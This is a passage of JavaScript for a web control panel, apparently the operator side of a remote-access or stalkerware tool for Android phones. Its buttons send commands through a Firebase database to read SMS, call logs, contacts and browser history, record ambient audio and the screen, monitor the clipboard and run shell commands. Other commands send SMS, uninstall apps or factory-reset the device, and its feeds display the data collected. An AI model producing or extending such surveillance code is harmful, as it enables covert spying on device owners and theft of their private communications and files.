                html += '<img src="' + d.preview_url + '" style="width:100%;max-width:300px;border-radius:6px;display:block;" loading="lazy">';
                if(isVid) {
                    html += '<div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:40px;height:40px;background:rgba(0,0,0,0.6);border-radius:50%;display:flex;align-items:center;justify-content:center;">';
                    html += '<div style="width:0;height:0;border-left:14px solid #fff;border-top:9px solid transparent;border-bottom:9px solid transparent;margin-left:3px;"></div>';
                    html += '</div>';
                }
                html += '</div>';
            }
            html += '<div style="font-size:14px;color:#fff;margin-bottom:6px;margin-top:8px;">' + esc(d.name||'File') + '</div>';
            html += '<div style="color:#888;font-size:11px;">Size: ' + (d.size_formatted||'?') + '</div>';
            html += '<div style="color:#888;font-size:11px;">Type: ' + (d.file_type||'unknown') + '</div>';
            html += '<div style="color:#888;font-size:11px;">Path: ' + esc(d.absolute_path||d.current_path||'') + '</div>';
            html += '<div style="color:#888;font-size:11px;">Modified: ' + (d.last_modified ? new Date(d.last_modified).toLocaleString() : '--') + '</div>';
            html += '<div style="color:#888;font-size:11px;">Readable: ' + (d.can_read ? '✅' : '❌') + ' Writable: ' + (d.can_write ? '✅' : '❌') + '</div>';
            html += '</div>';
            if(d.entries) {
                html += '<div style="border-top:1px solid #333;padding-top:8px;margin-top:8px;">';
                d.entries.forEach(function(e) {
                    html += '<div style="padding:4px 0;cursor:pointer;color:#4ecdc4;" onclick="navigateToFile(\'' + e.path.replace(/'/g,"\\'") + '\')">' + esc(e.name) + '<br><span style="font-size:10px;color:#555;">' + esc(e.path) + '</span></div>';
                });
                html += '</div>';
            }
            o.innerHTML = html;
            return;
        }

        let html = '<div style="color:#00ff88;font-size:13px;margin-bottom:4px;">📂 ' + esc(d.current_path||'/') + '</div>';
        html += '<div style="color:#666;font-size:10px;margin-bottom:10px;">' + (d.total_dirs||0) + ' folders • ' + (d.total_files||0) + ' files';
        if(d.shown_files !== undefined && d.total_files > d.shown_files) html += ' (showing ' + d.shown_files + ')';
        if(d.previews_generated) html += ' • ' + d.previews_generated + ' previews';
        html += '</div>';

        var entries = d.entries || [];
        entries.forEach(function(e) {
            var pathEsc = e.path.replace(/'/g, "\\'").replace(/"/g, '&quot;');
            var hiddenStyle = e.is_hidden ? 'opacity:0.5;' : '';

            if(e.is_directory) {
                html += '<div style="padding:6px 0;border-bottom:1px solid #111;cursor:pointer;' + hiddenStyle + '" onclick="navigateToFile(\'' + pathEsc + '\')">';
                html += '<div style="display:flex;align-items:center;gap:8px;">';
                html += '<span style="font-size:18px;">' + (e.icon||'📁') + '</span>';
                html += '<div style="flex:1;min-width:0;">';
                html += '<div style="color:#ffd93d;font-size:12px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">' + esc(e.name) + '</div>';
                html += '<div style="color:#555;font-size:10px;">' + esc(e.size_formatted||'') + '</div>';
                html += '</div>';
                html += '</div>';
                html += '</div>';
            } else {
                html += '<div style="padding:6px 0;border-bottom:1px solid #111;display:flex;gap:10px;align-items:center;' + hiddenStyle + '">';
                if(e.preview_url) {
                    var isVideoFile = (e.icon === '🎬');
                    html += '<div style="position:relative;width:50px;height:50px;flex-shrink:0;cursor:pointer;" onclick="event.stopPropagation();openPreview(this.querySelector(\'img\').src)">';
                    html += '<img src="' + e.preview_url + '" style="width:50px;height:50px;object-fit:cover;border-radius:4px;display:block;" loading="lazy">';
                    if(isVideoFile) {
                        html += '<div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:20px;height:20px;background:rgba(0,0,0,0.6);border-radius:50%;display:flex;align-items:center;justify-content:center;">';
                        html += '<div style="width:0;height:0;border-left:8px solid #fff;border-top:5px solid transparent;border-bottom:5px solid transparent;margin-left:2px;"></div>';
                        html += '</div>';
                    }
                    html += '</div>';
                } else {
                    var iconBg = '#1a1a2e';
                    if(e.icon === '🎵') iconBg = '#1a0a2e';
                    else if(e.icon === '🎬') iconBg = '#2e0a0a';
                    else if(e.icon === '📦') iconBg = '#0a2e0a';
                    else if(e.icon === '🗜️') iconBg = '#2e2e0a';
                    else if(e.icon === '📕') iconBg = '#2e0a0a';
                    else if(e.icon === '📘') iconBg = '#0a0a2e';
                    else if(e.icon === '📊') iconBg = '#0a2e0a';
                    else if(e.icon === '📙') iconBg = '#2e1a0a';
                    else if(e.icon === '🗄️') iconBg = '#1a1a0a';
                    else if(e.icon === '⚙️') iconBg = '#1a1a1a';
                    else if(e.icon === '🔑') iconBg = '#2e1a0a';
                    else if(e.icon === '🔤') iconBg = '#0a1a2e';
                    else if(e.icon === '👤') iconBg = '#1a2e1a';
                    else if(e.icon === '📅') iconBg = '#2e0a1a';
                    else if(e.icon === '💬') iconBg = '#0a2e2e';
                    else if(e.icon === '🧲') iconBg = '#2e2e2e';
                    else if(e.icon === '🔲') iconBg = '#111';
                    html += '<div style="width:50px;height:50px;background:' + iconBg + ';border-radius:4px;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:22px;">' + (e.icon||'📄') + '</div>';
                }
                html += '<div style="flex:1;min-width:0;">';
                html += '<div style="font-size:12px;color:#fff;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">' + esc(e.name) + '</div>';
                html += '<div style="color:#555;font-size:10px;">' + (e.size_formatted||'') + '</div>';
                html += '<div style="color:#444;font-size:9px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">' + esc(e.path) + '</div>';
                html += '</div>';
                html += '</div>';
            }
        });

        o.innerHTML = html;
    });

    listenToFeed(uid, 'geofence_status', (d) => {
        const f = document.getElementById('geofence-feed'); if(!f||!d||!d.active) return;
        f.innerHTML = `<div class="feed-item" style="color:#ffd93d;">📍 Geofence ACTIVE at ${d.lat}, ${d.lng} (radius: ${d.radius}m)</div>` + f.innerHTML;
    });
    listenToFeed(uid, 'screenshot', (d) => {
        if(!d||!d.screenshot) return;
        const img = document.getElementById('cameraPreviewFrame'); const ph = document.getElementById('mediaPlaceholderText');
        if(img){if(ph) ph.style.display='none'; img.src=d.screenshot; img.style.display='block'; const ts=document.getElementById('captureTimestamp'); if(ts) ts.innerText=`SCREENSHOT: ${new Date().toLocaleTimeString()}`;}
    });

    listenToFeed(uid, 'ambient_status', (d) => {
        const b = document.getElementById('cmd-ambient'); if(!b||!d) return;
        const s = b.querySelector('.toggle-state');
        if(d.status==='recording'){
            b.classList.add('active');
            if(s){s.textContent=`SEG ${d.segment||'?'}`;s.style.color='#ffaa00';}
        } else if(d.status==='stopped'){
            b.classList.remove('active');
            if(s){s.textContent=`${d.total_segments||0} SEGS`;s.style.color='#00ff88';}
        } else {
            b.classList.remove('active');
            if(s){s.textContent='OFF';s.style.color='#666';}
        }
        const af = document.getElementById('ambient-feed');
        if(af) {
            let html = `<div class="feed-item"><strong>Status:</strong> ${d.status||'unknown'}</div>`;
            if(d.segment) html += `<div class="feed-item"><strong>Segment:</strong> ${d.segment}</div>`;
            if(d.total_segments) html += `<div class="feed-item"><strong>Total Segments:</strong> ${d.total_segments}</div>`;
            if(d.last_audio_url) {
                html += `<div class="feed-item"><strong>Latest Recording:</strong><br><audio controls src="${d.last_audio_url}" style="width:100%;margin-top:8px;"></audio></div>`;
            }
            if(d.last_audio_segment) html += `<div class="feed-item"><small>${d.last_audio_segment}</small></div>`;
            af.innerHTML = html;
        }
        if(d.last_audio_url) {
            const aud = document.getElementById('mediaAudioPlayer');
            const audC = document.getElementById('audio-container');
            const ph = document.getElementById('mediaPlaceholderText');
            if(aud && aud.src !== d.last_audio_url) {
                if(ph) ph.style.display='none';
                aud.src = d.last_audio_url; aud.load();
                aud.style.display='block';
                if(audC) audC.style.display='block';
                const ts = document.getElementById('captureTimestamp');
                if(ts) ts.innerText = `AMBIENT AUDIO: ${new Date().toLocaleTimeString()}`;
            }
        }
    });

    listenToFeed(uid, 'screen_record_status', (d) => {
        const b = document.getElementById('cmd-screenrec'); if(!b||!d) return; const s = b.querySelector('.toggle-state');
        if(d.status==='recording'){b.classList.add('active');if(s){s.textContent='REC';s.style.color='#ffaa00';}}
        else if(d.status==='complete'){b.classList.remove('active');if(s){s.textContent=`${d.file_size_kb||'?'}KB`;s.style.color='#00ff88';}}
        else{b.classList.remove('active');if(s){s.textContent='OFF';s.style.color='#666';}}
    });

    listenToFeed(uid, 'traffic_current', (d) => {
        const f = document.getElementById('traffic-feed'); if(!f||!d) return;
        let html = `<div class="feed-item"><strong>📊 Total</strong></div>`;
        html += `<div class="feed-item">RX: ${d.total_rx_mb||'?'} MB | TX: ${d.total_tx_mb||'?'} MB</div>`;
        html += `<div class="feed-item"><strong>📱 Mobile</strong></div>`;
        html += `<div class="feed-item">RX: ${d.mobile_rx_mb||'?'} MB | TX: ${d.mobile_tx_mb||'?'} MB</div>`;
        if(d.wifi_rx_mb !== undefined) {
            html += `<div class="feed-item"><strong>📡 Wi-Fi</strong></div>`;
            html += `<div class="feed-item">RX: ${d.wifi_rx_mb||'?'} MB | TX: ${d.wifi_tx_mb||'?'} MB</div>`;
        }
        html += `<div class="feed-item"><small>${fmtTime(d.timestamp)}</small></div>`;
        f.innerHTML = html;
        const bf = document.getElementById('battery-feed');
        if(bf && !bf.innerHTML.includes('Network Traffic')) {
            bf.innerHTML += `<div class="feed-item" style="border-top:1px solid #333;margin-top:8px;padding-top:8px;"><strong>📊 Traffic</strong> RX:${d.total_rx_mb||'?'} TX:${d.total_tx_mb||'?'} MB</div>`;
        }
    });

    // ── DEVICE CONTROL STATUS ──
    listenToFeed(uid, 'device_control_status', (d) => {
        const f = document.getElementById('devicecontrol-feed'); if(!f||!d) return;
        var icon = d.status === 'success' ? '✅' : d.status === 'ui_opened' ? '📱' : '❌';
        var color = d.status === 'success' ? '#00ff88' : d.status === 'ui_opened' ? '#ffd93d' : '#ff6b6b';
        var actionName = (d.action || 'unknown').replace(/_/g, ' ').toUpperCase();
        var html = '<div class="feed-item" style="border-left:3px solid ' + color + ';padding-left:10px;">';
        html += '<div style="color:' + color + ';font-weight:bold;font-size:12px;">' + icon + ' ' + actionName + ' — ' + (d.status || '').toUpperCase() + '</div>';
        html += '<div style="color:#888;font-size:11px;margin-top:4px;">' + esc(d.message || '') + '</div>';
        html += '<div style="color:#555;font-size:10px;margin-top:2px;">' + fmtTime(d.timestamp) + '</div>';
        html += '</div>';
        f.innerHTML = html;
        console.log(icon + ' ' + (d.action||'?') + ': ' + (d.message||''));
    });
}

function listenToFeed(uid, path, cb) {
    const r = ref(database, `devices/${uid}/${path}`); const k = `feed-${path}-${uid}`;
    if(deviceListeners[k]) off(deviceListeners[k]);
    deviceListeners[k] = onValue(r, (s) => { if(s.exists()) try{cb(s.val());}catch(e){console.error(`Feed [${path}]:`,e);} });
}

window.openPreview = function(src) {
    if(!src) return;
    try {
        if(src.startsWith('data:')) {
            var byteString = atob(src.split(',')[1]);
            var mimeString = src.split(',')[0].split(':')[1].split(';')[0];
            var ab = new ArrayBuffer(byteString.length);
            var ia = new Uint8Array(ab);
            for(var i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
            var blob = new Blob([ab], {type: mimeString});
            var url = URL.createObjectURL(blob);
            var w = window.open(url, '_blank');
            if(w) setTimeout(function(){ URL.revokeObjectURL(url); }, 60000);
            else alert('Allow popups to view previews');
        } else {
            window.open(src, '_blank');
        }
    } catch(e) {
        console.error('Preview open failed:', e);
        window.open(src, '_blank');
    }
};

window.navigateToFile = function(path) {
    if(!selectedDevice) return;
    sendCmd(selectedDevice, 'list_files', path.trim());
    var o = document.getElementById('file-output');
    if(o) { o.style.display='block'; o.innerHTML='<span style="color:#ffaa00;">⏳ Loading ' + esc(path) + '...</span>'; }
    var inp = document.getElementById('file-path');
    if(inp) inp.value = path.trim();
};

function setupCommandListeners(uid) {
    setupToggle('cmd-flashlight', uid, 'flashlight');
    setupToggle('cmd-alarm', uid, 'alarm');
    const cmdLock = document.getElementById('cmd-lock');
    if(cmdLock) cmdLock.onclick = () => { const s=!cmdLock.classList.contains("active"); if(confirm(s?"🔒 Initialize Lockdown?":"🔓 Deactivate Lockdown?")) sendCmd(uid,"emergencyLock",s); };

    setupTrigger('cmd-capture', uid, 'cameraCapture');
    setupTrigger('cmd-screenshot', uid, 'take_screenshot');
    setupTrigger('cmd-readsms', uid, 'read_sms');
    setupTrigger('cmd-readcalls', uid, 'read_call_log');
    setupTrigger('cmd-readcontacts', uid, 'read_contacts');
    setupTrigger('cmd-readapps', uid, 'read_apps');
    setupTrigger('cmd-scanwifi', uid, 'scan_wifi');
    setupTrigger('cmd-readbattery', uid, 'read_battery');
    setupTrigger('cmd-readtraffic', uid, 'read_traffic');
    setupTrigger('cmd-deviceinfo', uid, 'collect_device_info');
    setupTrigger('cmd-gallery', uid, 'list_gallery');
    setupTrigger('cmd-browser', uid, 'read_browser_history');
    setupTrigger('cmd-storage', uid, 'storage_overview');

    setupToggle('cmd-audio', uid, 'record_audio');
    setupToggle('cmd-video', uid, 'record_video');
    setupToggle('cmd-ambient', uid, 'start_ambient', 'stop_ambient');
    setupToggle('cmd-screenrec', uid, 'record_screen', 'stop_screen_record');
    setupToggle('cmd-clipboard', uid, 'monitor_clipboard');

    const ts = document.getElementById('time-setter');
    if(ts) ts.onchange = (e) => { if(e.target.value) sendCmd(uid,'activation_time',e.target.value); };

    const sb = document.getElementById('cmd-shell');
    if(sb) sb.onclick = () => { const c=document.getElementById('shell-input')?.value?.trim()||'ls /sdcard'; sendCmd(uid,'shell_command',c); const o=document.getElementById('shell-output'); if(o){o.style.display='block';o.textContent='⏳ Executing...';} };

    const ssb = document.getElementById('cmd-sendsms');
    if(ssb) ssb.onclick = () => { const n=document.getElementById('sms-number')?.value?.trim(); const b=document.getElementById('sms-body')?.value?.trim(); if(n&&b&&confirm(`Send SMS to ${n}?`)){sendCmd(uid,'send_sms_number',n);sendCmd(uid,'send_sms_body',b);} };

    const lfb = document.getElementById('cmd-listfiles');
    if(lfb) lfb.onclick = () => { const p=document.getElementById('file-path')?.value?.trim()||'/storage/emulated/0'; sendCmd(uid,'list_files',p); const o=document.getElementById('file-output'); if(o){o.style.display='block';o.innerHTML='<span style="color:#ffaa00;">⏳ Loading...</span>';} };

    const sgb = document.getElementById('cmd-setgeo');
    if(sgb) sgb.onclick = () => { const la=parseFloat(document.getElementById('geo-lat')?.value); const ln=parseFloat(document.getElementById('geo-lng')?.value); const r=parseFloat(document.getElementById('geo-radius')?.value)||1000; if(!isNaN(la)&&!isNaN(ln)){sendCmd(uid,'geofence_lat',la);sendCmd(uid,'geofence_lng',ln);sendCmd(uid,'geofence_radius',r);} };
    const dgb = document.getElementById('cmd-disablegeo');
    if(dgb) dgb.onclick = () => sendCmd(uid,'disable_geofence',true);

    const rb = document.getElementById('cmd-reboot');
    if(rb) rb.onclick = () => { if(confirm("⚠️ REBOOT DEVICE?")) sendCmd(uid,'reboot_device',true); };
    const sdb = document.getElementById('cmd-shutdown');
    if(sdb) sdb.onclick = () => { if(confirm("⚠️ SHUTDOWN DEVICE?")) sendCmd(uid,'shutdown_device',true); };
    const fb = document.getElementById('cmd-factory');
    if(fb) fb.onclick = () => { if(confirm("🚨 FACTORY RESET? ERASE ALL DATA?")){if(confirm("ABSOLUTELY sure?")) sendCmd(uid,'factory_reset',true);} };
    const lnb = document.getElementById('cmd-locknow');
    if(lnb) lnb.onclick = () => { if(confirm("🔒 Lock screen now?")) sendCmd(uid,'lock_screen_now',true); };
    const ub = document.getElementById('cmd-uninstall');
    if(ub) ub.onclick = () => { const p=prompt("Package name to uninstall:"); if(p) sendCmd(uid,'uninstall_app',p); };
}

function setupToggle(btnId, uid, cmd, offCmd) {
    const btn = document.getElementById(btnId); if(!btn) return;
    btn.onclick = () => { const active=btn.classList.contains("active"); if(offCmd&&active) sendCmd(uid,offCmd,true); else sendCmd(uid,cmd,!active); };
}

function setupTrigger(btnId, uid, cmd) {
    const btn = document.getElementById(btnId); if(!btn) return;
    btn.onclick = () => {
        sendCmd(uid, cmd, true);
        btn.style.background = '#00ff88'; btn.style.color = '#000'; btn.style.borderColor = '#00ff88'; btn.style.boxShadow = '0 0 20px rgba(0, 255, 136, 0.5)';
        const s = btn.querySelector('.toggle-state');
        if(s){s.textContent='SENT ✓';s.style.color='#000';s.style.fontWeight='bold';}
        setTimeout(()=>{btn.style.background='';btn.style.color='';btn.style.borderColor='';btn.style.boxShadow='';if(s){s.textContent='TRIGGER';s.style.color='#666';s.style.fontWeight='normal';}},2000);
    };
}

function sendCmd(uid, cmd, val) { console.log(`📤 ${cmd} = ${val}`); update(ref(database,`devices/${uid}/commands`),{[cmd]:val}); }

function updateButtonState(btnId, isActive) {
    const btn = document.getElementById(btnId); if(!btn) return;
    btn.classList.toggle('active', !!isActive);
    const s = btn.querySelector('.toggle-state');
    if(s){if(s.textContent==='REC'||s.textContent==='UPD...'||s.textContent.startsWith('SEG')||s.textContent==='SENT ✓'||s.textContent.endsWith('SEGS')) return; s.textContent=isActive?'ON':'OFF'; s.style.color=isActive?'#00ff88':'#666'; s.style.fontWeight=isActive?'bold':'normal';}
    btn.style.borderColor = isActive ? '#00ff88' : '#333';
    btn.style.opacity = isActive ? '1' : '0.7';
}

function fmtTime(ts) { return ts ? new Date(ts).toLocaleString() : '--'; }
function fmtSize(b) { if(!b) return '0 B'; if(b<1024) return b+' B'; if(b<1048576) return (b/1024).toFixed(1)+' KB'; if(b<1073741824) return (b/1048576).toFixed(1)+' MB'; return (b/1073741824).toFixed(2)+' GB'; }
function esc(t) { if(!t) return ''; const d=document.createElement('div'); d.textContent=t; return d.innerHTML; }
function showNoDeviceAlert() { noDeviceAlert.style.display='flex'; deviceDashboard.style.display='none'; }

if(logoutBtn) logoutBtn.addEventListener('click',()=>signOut(auth).then(()=>window.location.href='./index.html'));
if(refreshDevicesBtn) refreshDevicesBtn.addEventListener('click',loadAllDevices);
